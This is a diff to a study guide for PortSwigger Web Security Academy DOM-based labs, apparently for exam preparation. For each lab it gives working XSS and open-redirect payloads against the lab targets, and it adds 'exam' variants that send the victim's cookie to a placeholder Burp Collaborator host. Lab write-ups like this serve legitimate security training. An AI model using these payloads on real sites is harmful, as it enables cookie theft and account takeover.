@@ -91,7 +91,14 @@ git-cola --repo TARGET.web-security-academy.net/
 
 - Signal: the page has a `window.addEventListener('message', ...)` meant to handle ads, which inserts `e.data` directly into the DOM (e.g. as the `innerHTML` of a `div`), without checking `e.origin` or encoding the content.
 - Solution: host an iframe that loads the vulnerable page and, on its `onload`, send a `postMessage` with a tag that abuses an error handler to run code (since a `<script>` injected via `innerHTML` won't execute), with `targetOrigin` `'*'`.
-- Payload: `<iframe src="https://TARGET/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`
+- Payload:
+```html
+<iframe src="https://TARGET/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
+```
+- Exam payload (Burp Collaborator/OAST): exfiltrates the base64-encoded cookie to the collector instead of just calling `print()`.
+```html
+<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=fetch(`https://OASTIFY.COM?collector=`+btoa(document.cookie))>','*')">
+```
 - Link: [DOM XSS using web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)
 - Step: 1
 
@@ -99,16 +106,35 @@ git-cola --repo TARGET.web-security-academy.net/
 
 - Signal: the event listener has a flawed `indexOf()` check that looks for the string `"http:"` (or `"https:"`) anywhere in the message, before passing the value to the `location.href` sink.
 - Solution: send a `javascript:` payload as the message data that also contains, somewhere in the string (e.g. after a `//` comment), the `"http:"` substring the check requires, so it passes the check and the sink runs the URL.
-- Payload: `this.contentWindow.postMessage('javascript:print()//http:','*')`
-- Exam payload (Burp Collaborator/OAST): `<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('javascript:document.location=\`https://OASTIFY.COM?c=\`+document.cookie','*')">` — here the check passes on its own, because the payload's URL already starts with `https:`, which contains the `http:` substring the check needs (no need to manually append `//http:`).
+- Payload:
+```html
+<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
+```
+- Exam payload (Burp Collaborator/OAST): here the check passes on its own, because the collector URL already starts with `https:`, which contains the `http:` substring the check needs (no need to manually append `//http:`).
+```html
+<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('javascript:document.location=`https://OASTIFY.COM?c=`+document.cookie','*')">
+```
 - Link: [DOM XSS using web messages and a JavaScript URL](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)
 - Step: 1
 
 **3. DOM XSS using web messages and JSON.parse**
 
 - Signal: the event listener runs `JSON.parse(e.data)` before using the result: it expects a `type` property, and inside a `switch` the matching case (e.g. `"load-channel"`) assigns the message's `url` property to the `src` of an inner iframe, without checking `e.origin` or validating the URL's scheme.
-- Solution: host an iframe that loads the vulnerable page and, on its `onload`, send a `postMessage` with a JSON string that sets `type` to the value the `switch` expects and `url` to a `javascript:` payload, exploiting the missing origin/scheme check to get the payload set as the inner iframe's `src`.
-- Payload: `this.contentWindow.postMessage('{"type":"load-channel","url":"javascript:print()"}','*')`
+- Solution: host an iframe that loads the vulnerable page and, on its `onload`, send a `postMessage` with the serialized (`JSON.stringify`) string below, which sets `type` to the value the `switch` expects and `url` to a `javascript:` payload, exploiting the missing origin/scheme check to get the payload set as the inner iframe's `src`.
+- Payload (message content):
+```json
+{
+    "type": "load-channel",
+    "url": "javascript:print()"
+}
+```
+- Exam payload (Burp Collaborator/OAST): exfiltrates the cookie instead of calling `print()`.
+```json
+{
+    "type": "load-channel",
+    "url": "JavaScript:document.location='https://OASTIFY.COM?c='+document.cookie"
+}
+```
 - Link: [DOM XSS using web messages and JSON.parse](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)
 - Step: 1
 
@@ -118,7 +144,10 @@ git-cola --repo TARGET.web-security-academy.net/
 
 - Signal: a link (e.g. "Back to Blog") uses a regex like `/url=(https?:\/\/.+)/` to pull a `url` parameter out of the current query string (`location`) and, if found, assigns it to the `location.href` sink; if not found, it falls back to the home page.
 - Solution: build and visit a URL directly that includes a `url` parameter pointing at the exploit server: the regex extracts it and the sink redirects there, no iframe or postMessage needed.
-- Payload: `https://TARGET/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/`
+- Payload:
+```
+https://TARGET/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/
+```
 - Link: [DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)
 - Step: 1
 
@@ -126,7 +155,10 @@ git-cola --repo TARGET.web-security-academy.net/
 
 - Signal: the page uses a client-side cookie (e.g. `lastViewedProduct`) whose value is taken from the URL of a visited page (e.g. a product page) and later reflected elsewhere (e.g. on the home page) without HTML-encoding.
 - Solution: use an iframe whose first URL is a product page with an XSS payload tacked onto the parameter (e.g. after closing an attribute), so the dirty value gets saved into the cookie; on its `onload`, immediately redirect the iframe to the home page (with a flag so this only happens once), where the poisoned cookie gets reflected and runs.
-- Payload: `<iframe src="https://TARGET/product?productId=1&'><script>print()</script>" onload="if(!window.x){window.x=1;this.src='https://TARGET/'}">`
+- Payload:
+```html
+<iframe src="https://TARGET/product?productId=1&'><script>print()</script>" onload="if(!window.x){window.x=1;this.src='https://TARGET/'}">
+```
 - Link: [DOM-based cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)
 - Step: 1
 
